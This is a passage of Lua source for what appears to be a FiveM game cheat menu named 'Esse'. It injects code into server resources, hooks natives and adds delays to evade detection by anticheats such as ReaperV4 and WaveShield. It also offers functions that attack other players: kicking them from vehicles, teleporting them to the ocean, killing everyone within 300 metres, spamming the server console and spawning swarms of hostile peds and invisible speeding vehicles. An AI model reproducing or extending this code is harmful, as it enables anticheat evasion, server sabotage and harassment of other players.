                                "nightshark", "banshee", "feltzer2", "ruston", "bullet", "elegy2"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "You must select a player to do this!", 3000)
                                    return
                                end
                                Esse:AttachSelectedVehicle(targetPlayers, value)
                                self:Notify("success", "Esse",
                                    "Vehicle Attached to " .. #targetPlayers .. " Player(s)", 5000)
                            end
                        },
                        { type = "divider", label = "Object Options" },
                        {
                            type = "scrollable",
                            label = "Attach",
                            desc = 'choose a object to attach on selected player',
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "bmx", "sanchez", "adder", "blista", "sultan", "faggio", "bati", "pcj",
                                "oppressor", "maverick", "buzzard", "cargobob", "t20", "comet",
                                "zentorno", "tampa", "nightshark", "kuruma", "buffalo", "massacro",
                                "ferrari", "comet2", "issi2", "vindicator", "baller", "baller2"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "You must select at least one player!", 3000)
                                    return
                                end

                                function Esse:GetSelectedObjectModel()
                                    return value
                                end

                                Esse:SpawnSelectedObject(targetPlayers)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Prop",
                            desc = 'choose a prop to attach on selected player',
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_barrel_02a", "prop_cone_float_1", "prop_chair_01a", "prop_boombox_01",
                                "prop_tool_broom", "prop_golf_ball", "prop_laptop_01a", "prop_trafficcone_01a",
                                "prop_pizza_box_01", "prop_mb_cargo_01a", "prop_ld_crate_01a", "prop_ld_fueldoor",
                                "prop_ld_greenscreen_01", "prop_ld_shovel", "prop_snow_bottle", "prop_snow_locker_01",
                                "prop_dummy_01", "prop_dummy_02"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "You must select at least one player!", 3000)
                                    return
                                end

                                function Esse:GetSelectedObjectModel()
                                    return value
                                end

                                Esse:SpawnSelectedObject(targetPlayers)

                                self:Notify("success", "Esse",
                                    "Spawned object '" ..
                                    tostring(value) .. "' for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Furniture",
                            desc = 'choose a Furniture to attach on selected player',
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_table_01", "prop_table_02", "prop_table_03", "prop_chair_02",
                                "prop_chair_03", "prop_chair_04a", "prop_sofa_01", "prop_sofa_02",
                                "prop_sofa_03", "prop_bed_01", "prop_bed_02", "prop_lamp_01",
                                "prop_lamp_02", "prop_lamp_03", "prop_couch_01", "prop_couch_02",
                                "prop_tv_01", "prop_tv_02", "prop_tv_03", "prop_computer_01",
                                "prop_computer_02", "prop_monitor_01", "prop_monitor_02"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "You must select at least one player!", 3000)
                                    return
                                end

                                function Esse:GetSelectedObjectModel()
                                    return value
                                end

                                Esse:SpawnSelectedObject(targetPlayers)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Misc",
                            desc = 'choose a prop to attach on selected player',
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_beer_bottle", "prop_soda_cup", "prop_papercup_01", "prop_cup_coffee_01",
                                "prop_champ_flute", "prop_cs_burger_01", "prop_cs_burger_02", "prop_cs_hotdog_01",
                                "prop_cs_pizza_01", "prop_cs_sandwich_01", "prop_cs_juice_01"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "Esse", "You must select at least one player!", 3000)
                                    return
                                end

                                function Esse:GetSelectedObjectModel()
                                    return value
                                end

                                Esse:SpawnSelectedObject(targetPlayers)

                                self:Notify("success", "Esse",
                                    "Spawned object '" ..
                                    tostring(value) .. "' for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },

                    }
                },
                {
                    label = "Vehicle",
                    tabs = {
                        {
                            type = "button",
                            label = "Kick From Vehicle",
                            desc = 'this will kick selected player from vehicle',
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 then
                                        self:Notify("error", "Esse",
                                            "There was an error while trying to kick the player from their vehicle! (ERR:1)",
                                            3000)
                                        CPlayers[targetPlayer] = nil
                                        Esse:UpdateListMenu()
                                        return
                                    end

                                    if not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(player))) then
                                        self:Notify("error", "Esse",
                                            "There was an error while trying to kick the player from their vehicle! (ERR:2)",
                                            3000)
                                        return
                                    end

                                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                                        for i = 1, 2 do
                                            MachoInjectResourceRaw(
                                            GetResourceState("911elemento") == "started" and "monitor" or "any", [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                        hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                        local function RequestControl(entity, timeoutMs)
                                            timeoutMs = timeoutMs or 2000
                                            local start = GetGameTimer()

                                            while (GetGameTimer() - start) < timeoutMs do
                                                if NetworkHasControlOfEntity(entity) then return true end
                                                NetworkRequestControlOfEntity(entity)
                                                Wait(0)
                                            end

                                            return NetworkHasControlOfEntity(entity)
                                        end

                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function GetEmptySeat(vehicle)
                                            local seats = { -1, 0, 1, 2 }

                                            for _, seat in ipairs(seats) do
                                                if IsVehicleSeatFree(vehicle, seat) then
                                                    return seat
                                                end
                                            end

                                            return -1
                                        end

                                        local player = PlayerPedId()

                                        local function KickFromVehicleNewestV8(vehicle)
                                            if not vehicle or not DoesEntityExist(vehicle) then
                                                return
                                            end

                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                                            if driver ~= 0 and DoesEntityExist(driver) then
                                                for i = 1, 1 do
                                                    SetPedIntoVehicle(player, vehicle, 0)
                                                    RequestControl(vehicle, 10)
                                                    DeletePed(driver)
                                                    SetPedIntoVehicle(player, vehicle, -1)
                                                    Wait(25)
                                                    TaskLeaveVehicle(player, vehicle, 16)
                                                    Wait(450)
                                                    -- DeleteEntity(vehicle)
                                                end

                                                Wait(100)
                                            end
                                        end

                                        CreateThread(function()
                                            local entityHit = ]] .. GetVehiclePedIsUsing(GetPlayerPed(player)) .. [[

                                            print(entityHit)

                                            if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                KickFromVehicleNewestV8(entityHit)
                                            end
                                        end)
                                    ]])
                                        end

                                        -- MachoInjectResourceRaw(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
                                        --     function hNative(nativeName, newFunction)
                                        --         local originalNative = _G[nativeName]
                                        --         if not originalNative or type(originalNative) ~= "function" then
                                        --             return
                                        --         end
                                        --         _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        --     end

                                        --     hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                        --     local function RequestControl(entity, timeoutMs)
                                        --         timeoutMs = timeoutMs or 2000
                                        --         local start = GetGameTimer()

                                        --         while (GetGameTimer() - start) < timeoutMs do
                                        --             if NetworkHasControlOfEntity(entity) then return true end
                                        --             NetworkRequestControlOfEntity(entity)
                                        --             Wait(0)
                                        --         end

                                        --         return NetworkHasControlOfEntity(entity)
                                        --     end

                                        --     local function RotationToDirection(rot)
                                        --         local z = math.rad(rot.z)
                                        --         local x = math.rad(rot.x)
                                        --         local num = math.abs(math.cos(x))
                                        --         return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        --     end

                                        --     function GetEmptySeat(vehicle)
                                        --         local seats = { -1, 0, 1, 2 }

                                        --         for _, seat in ipairs(seats) do
                                        --             if IsVehicleSeatFree(vehicle, seat) then
                                        --                 return seat
                                        --             end
                                        --         end

                                        --         return -1
                                        --     end

                                        --     local player = PlayerPedId()
                                        --     local oldCoords = GetEntityCoords(player)

                                        --     local function KickFromVehicle(vehicle)
                                        --         if not vehicle or not DoesEntityExist(vehicle) then
                                        --             return
                                        --         end

                                        --         local driver = GetPedInVehicleSeat(vehicle, -1)
                                        --         if driver ~= 0 and DoesEntityExist(driver) then
                                        --             SetPedIntoVehicle(player, vehicle, 0)
                                        --             RequestControl(vehicle, 2000)
                                        --             Wait(10)

                                        --             for i = 0, 4 do
                                        --                 DeletePed(driver)
                                        --             end

                                        --             Wait(40)
                                        --             SetPedIntoVehicle(player, vehicle, -1)
                                        --             Wait(1)
                                        --             SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                        --             Wait(1)
                                        --             SetPedIntoVehicle(player, vehicle, -1)
                                        --             TaskLeaveVehicle(player, vehicle, 16)
                                        --             Wait(450)
                                        --             ClearPedTasksImmediately(player)
                                        --             SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                        --             Wait(100)
                                        --         end
                                        --     end

                                        --     CreateThread(function()
                                        --         local entityHit = ]] .. GetVehiclePedIsUsing(GetPlayerPed(player)) .. [[

                                        --         print(entityHit)

                                        --         if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        --             KickFromVehicle(entityHit)
                                        --         end
                                        --     end)
                                        -- ]])
                                    else
                                        return
                                    end

                                    CPlayers[targetPlayer] = true
                                    self:UpdateListMenu()
                                else
                                    self:Notify("error", "Esse", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Teleport to Ocean",
                            desc = 'this will bring selected player to ocean',
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 then
                                        self:Notify("error", "Esse",
                                            "There was an error while trying to kick the player from their vehicle! (ERR:1)",
                                            3000)
                                        CPlayers[targetPlayer] = nil
                                        Esse:UpdateListMenu()
                                        return
                                    end

                                    if not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(player))) then
                                        self:Notify("error", "Esse",
                                            "There was an error while trying to kick the player from their vehicle! (ERR:2)",
                                            3000)
                                        return
                                    end

                                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                                        for i = 1, 2 do
                                            MachoInjectResourceRaw(
                                            GetResourceState("911elemento") == "started" and "monitor" or "any", [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                        hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                        local function RequestControl(entity, timeoutMs)
                                            timeoutMs = timeoutMs or 2000
                                            local start = GetGameTimer()

                                            while (GetGameTimer() - start) < timeoutMs do
                                                if NetworkHasControlOfEntity(entity) then return true end
                                                NetworkRequestControlOfEntity(entity)
                                                Wait(0)
                                            end

                                            return NetworkHasControlOfEntity(entity)
                                        end

                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function GetEmptySeat(vehicle)
                                            local seats = { -1, 0, 1, 2 }

                                            for _, seat in ipairs(seats) do
                                                if IsVehicleSeatFree(vehicle, seat) then
                                                    return seat
                                                end
                                            end

                                            return -1
                                        end

                                        local player = PlayerPedId()

                                        local function TeleportVehicleToOcean(vehicle)
                                            if not vehicle or not DoesEntityExist(vehicle) then
                                                return
                                            end

                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                                            if driver ~= 0 and DoesEntityExist(driver) then
                                                for i = 1, 1 do
                                                    SetPedIntoVehicle(player, vehicle, 0)
                                                    RequestControl(vehicle, 10)
                                                    DeletePed(driver)
                                                    SetPedIntoVehicle(player, vehicle, -1)
                                                    Wait(25)
                                                    SetEntityCoords(vehicle, 0.0, 0.0, 0.0, false, false, false, false)
                                                    -- DeleteEntity(vehicle)
                                                end

                                                Wait(100)
                                            end
                                        end

                                        CreateThread(function()
                                            local entityHit = ]] .. GetVehiclePedIsUsing(GetPlayerPed(player)) .. [[

                                            print(entityHit)

                                            if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                TeleportVehicleToOcean(entityHit)
                                            end
                                        end)
                                    ]])
                                        end

                                        -- MachoInjectResourceRaw(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
                                        --     function hNative(nativeName, newFunction)
                                        --         local originalNative = _G[nativeName]
                                        --         if not originalNative or type(originalNative) ~= "function" then
                                        --             return
                                        --         end
                                        --         _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        --     end

                                        --     hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                        --     local function RequestControl(entity, timeoutMs)
                                        --         timeoutMs = timeoutMs or 2000
                                        --         local start = GetGameTimer()

                                        --         while (GetGameTimer() - start) < timeoutMs do
                                        --             if NetworkHasControlOfEntity(entity) then return true end
                                        --             NetworkRequestControlOfEntity(entity)
                                        --             Wait(0)
                                        --         end

                                        --         return NetworkHasControlOfEntity(entity)
                                        --     end

                                        --     local function RotationToDirection(rot)
                                        --         local z = math.rad(rot.z)
                                        --         local x = math.rad(rot.x)
                                        --         local num = math.abs(math.cos(x))
                                        --         return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        --     end

                                        --     function GetEmptySeat(vehicle)
                                        --         local seats = { -1, 0, 1, 2 }

                                        --         for _, seat in ipairs(seats) do
                                        --             if IsVehicleSeatFree(vehicle, seat) then
                                        --                 return seat
                                        --             end
                                        --         end

                                        --         return -1
                                        --     end

                                        --     local player = PlayerPedId()
                                        --     local oldCoords = GetEntityCoords(player)

                                        --     local function KickFromVehicle(vehicle)
                                        --         if not vehicle or not DoesEntityExist(vehicle) then
                                        --             return
                                        --         end

                                        --         local driver = GetPedInVehicleSeat(vehicle, -1)
                                        --         if driver ~= 0 and DoesEntityExist(driver) then
                                        --             SetPedIntoVehicle(player, vehicle, 0)
                                        --             RequestControl(vehicle, 2000)
                                        --             Wait(10)

                                        --             for i = 0, 4 do
                                        --                 DeletePed(driver)
                                        --             end

                                        --             Wait(40)
                                        --             SetPedIntoVehicle(player, vehicle, -1)
                                        --             Wait(1)
                                        --             SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                        --             Wait(1)
                                        --             SetPedIntoVehicle(player, vehicle, -1)
                                        --             TaskLeaveVehicle(player, vehicle, 16)
                                        --             Wait(450)
                                        --             ClearPedTasksImmediately(player)
                                        --             SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                        --             Wait(100)
                                        --         end
                                        --     end

                                        --     CreateThread(function()
                                        --         local entityHit = ]] .. GetVehiclePedIsUsing(GetPlayerPed(player)) .. [[

                                        --         print(entityHit)

                                        --         if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        --             KickFromVehicle(entityHit)
                                        --         end
                                        --     end)
                                        -- ]])
                                    else
                                        return
                                    end

                                    CPlayers[targetPlayer] = true
                                    self:UpdateListMenu()
                                else
                                    self:Notify("error", "Esse", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                    }
                },
                {
                    label = "All",
                    tabs = {
                        {
                            type = "checkbox",
                            label = "Kill All (300m)",
                            desc = "Continuously kills all players within 300 meters (headshot + damage backup)",
                            icon = "ph-skull",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    Esse:Notify("warning", "Kill All",
                                        "ENABLED – Killing all players within 300m", 4000)

                                    MachoInjectResourceRaw("monitor", [[
            _G.paranoiaKillAllActive = true

            Citizen.CreateThread(function()
                local weaponHash = GetHashKey("WEAPON_SNIPERRIFLE")  -- Malakas, isang hit lang

                while _G.paranoiaKillAllActive do
                    local myPed = PlayerPedId()
                    local myCoords = GetEntityCoords(myPed)

                    for _, player in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(player)
                        local targetId = GetPlayerServerId(player)

                        if targetPed ~= myPed and DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed) then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(myCoords - targetCoords)

                            if distance <= 300.0 then
                                -- Kunin ang kontrol ng target ped
                                if not NetworkHasControlOfEntity(targetPed) then
                                    NetworkRequestControlOfEntity(targetPed)
                                    local timeout = 0
                                    while not NetworkHasControlOfEntity(targetPed) and timeout < 20 do
                                        Citizen.Wait(50)
                                        timeout = timeout + 1
                                    end
                                end

                                -- Barilin sa ulo mula sa sarili
                                local head = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.0)
                                ShootSingleBulletBetweenCoords(
                                    head.x, head.y, head.z + 0.2,
                                    head.x, head.y, head.z,
                                    500, true, weaponHash, myPed, true, false, 1200.0
                                )

                                -- Backup damage kung hindi namatay agad
                                Citizen.Wait(50)
                                if GetEntityHealth(targetPed) > 0 then
                                    ApplyDamageToPed(targetPed, 500, true, nil, 0)
                                end

                                -- I‑clear ang invincibility flags
                                SetEntityInvincible(targetPed, false)
                                SetPlayerInvincible(GetPlayerFromServerId(targetId), false)
                            end
                        end
                    end

                    -- Maghintay bago ulitin (iwas lag at detection)
                    Citizen.Wait(500)
                end
            end)
        ]])
                                else
                                    Esse:Notify("error", "Kill All", "DISABLED – Stopped killing players", 4000)
                                    MachoInjectResourceRaw("monitor", [[
            _G.paranoiaKillAllActive = false
        ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Server Console Spam",
                            desc = 'this spam on random things on server console',
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    Injection(
                                    GetResourceState("monitor") == "started" and "monitor" or
                                    GetResourceState("WaveShield") == "started" and "WaveShield" or "any", [[
                                if not _G.EsseServerConsoleSpamInitialized then
                                    _G.EsseServerConsoleSpamEnabled = true
                                    _G.EsseServerConsoleSpamInitialized = true

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("CreateThread", function(fn, cb) return fn(cb) end)
                                    HookNative("Wait", function(fn, ms) return fn(ms) end)
                                    HookNative("TriggerEvent", function(fn, ...) return fn(...) end)
                                    HookNative("TriggerServerEvent", function(fn, ...) return fn(...) end)

                                    if not _G.Esse then
                                        _G.Esse = {
                                            TEvent = function(e, ...) return TriggerEvent(e, ...) end,
                                            TSEvent = function(e, ...) return TriggerServerEvent(e, ...) end
                                        }
                                    end

                                    local function initFlow(cb)
                                        local co = coroutine.create(cb)
                                        local ok, err
                                        while coroutine.status(co) ~= "dead" do
                                            ok, err = coroutine.resume(co)
                                            if not ok then
                                                print("WaveShield Spam Coroutine error:", err)
                                                break
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end

                                    initFlow(function()
                                        Citizen.Wait(500) -- Anti-detection delay
                                        while _G.EsseServerConsoleSpamInitialized do
                                            if not _G.EsseServerConsoleSpamEnabled then
                                                Citizen.Wait(500)
                                            else
                                                _G.Esse.TSEvent("playerLoaded")
                                                Citizen.Wait(75)
                                            end
                                        end
                                    end)
                                else
                                    _G.EsseServerConsoleSpamEnabled = true
                                end
                            ]])
                                else
                                    Injection(
                                    GetResourceState("monitor") == "started" and "monitor" or
                                    GetResourceState("WaveShield") == "started" and "WaveShield" or "any", [[
                                _G.EsseServerConsoleSpamEnabled = false
                            ]])
                                end
                            end
                        },

                        {
                            type = "divider",
                            label = "Risky Chaos"
                        },


                        {
                            type = "checkbox",
                            label = "Esse Chaos (Risky)",
                            desc =
                            "Spawns aggressive animals/peds, invisible high-speed vehicles, and beach balls on all players. VERY RISKY!",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    Esse:Notify("warning", "CHAOS", "Esse Chaos STARTED! This is very risky.",
                                        5000)

                                    MachoInjectResourceRaw("monitor", [[
            _G.ChaosActive = true

            local MODELS = {
                "a_c_cat_01","a_c_chop","a_c_cow","a_c_coyote","a_c_deer",
                "a_c_hen","a_c_husky","a_c_pig","a_c_pigeon",
                "a_c_rabbit_01","a_c_rat","a_c_retriever",
                "a_c_rottweiler","a_c_seagull","a_c_shepherd",
                "a_c_westy",
                "s_m_m_paramedic_01","s_m_y_cop_01","s_m_y_fireman_01",
                "u_m_m_aldinapoli","u_m_y_juggernaut_01"
            }

            local MAX_PEDS = 250
            local SPAWN_RADIUS = 300.0
            local vehmodels = {"jugular", "tanker", "marquis"}
            local spawnedPeds = {}

            -- Preload models
            Citizen.CreateThread(function()
                for _, m in ipairs(MODELS) do
                    if not _G.ChaosActive then break end
                    local hash = GetHashKey(m)
                    RequestModel(hash)
                    while not HasModelLoaded(hash) and _G.ChaosActive do Wait(10) end
                end
            end)

            -- Spawn aggressive peds around players
            Citizen.CreateThread(function()
                local playerPed = PlayerPedId()
                while not DoesEntityExist(playerPed) do Wait(100) playerPed = PlayerPedId() end
                local coords = GetEntityCoords(playerPed)

                for i = 1, MAX_PEDS do
                    if not _G.ChaosActive then break end
                    local model = MODELS[math.random(#MODELS)]
                    local hash = GetHashKey(model)
                    RequestModel(hash)
                    while not HasModelLoaded(hash) do Wait(10) end

                    local ped = CreatePed(28, hash,
                        coords.x + math.random(-SPAWN_RADIUS, SPAWN_RADIUS),
                        coords.y + math.random(-SPAWN_RADIUS, SPAWN_RADIUS),
                        coords.z, math.random(0, 360), true, false)

                    SetPedCombatAttributes(ped, 46, true)
                    SetPedCombatAbility(ped, 2)
                    SetPedCombatRange(ped, 2)
                    SetPedAccuracy(ped, 60)
                    table.insert(spawnedPeds, ped)
                    Wait(50)
                end
            end)

            -- Command peds to attack random players
            Citizen.CreateThread(function()
                while _G.ChaosActive do
                    for _, ped in ipairs(spawnedPeds) do
                        if DoesEntityExist(ped) and not IsPedDeadOrDying(ped) then
                            local players = GetActivePlayers()
                            if #players > 0 then
                                local targetPid = players[math.random(#players)]
                                local target = GetPlayerPed(targetPid)
                                if DoesEntityExist(target) then
                                    TaskCombatPed(ped, target, 0, 16)
                                end
                            end
                        end
                    end
                    Wait(1000)
                end
            end)

            -- Spawn invisible high-speed vehicles near players
            Citizen.CreateThread(function()
                while _G.ChaosActive do
                    local model = vehmodels[math.random(#vehmodels)]
                    local vHash = GetHashKey(model)

                    RequestModel(vHash)
                    while not HasModelLoaded(vHash) and _G.ChaosActive do Wait(10) end

                    if _G.ChaosActive then
                        for _, playerId in ipairs(GetActivePlayers()) do
                            local ped = GetPlayerPed(playerId)
                            if DoesEntityExist(ped) then
                                local pos = GetEntityCoords(ped)
                                local heading = GetEntityHeading(ped)

                                local vehicle = CreateVehicle(vHash, pos.x, pos.y, pos.z, heading, true, false)
                                SetEntityAlpha(vehicle, 0)
                                NetworkSetEntityInvisibleToNetwork(vehicle, true)
                                SetVehicleForwardSpeed(vehicle, 90.0)
                                SetEntityAsNoLongerNeeded(vehicle)
                            end
                        end
                    end
                    Citizen.Wait(1300)
                end
            end)

            -- Spam beach balls on all players
            Citizen.CreateThread(function()
                while _G.ChaosActive do
                    Citizen.Wait(100)
                    for _, playerId in ipairs(GetActivePlayers()) do
                        local ped = GetPlayerPed(playerId)
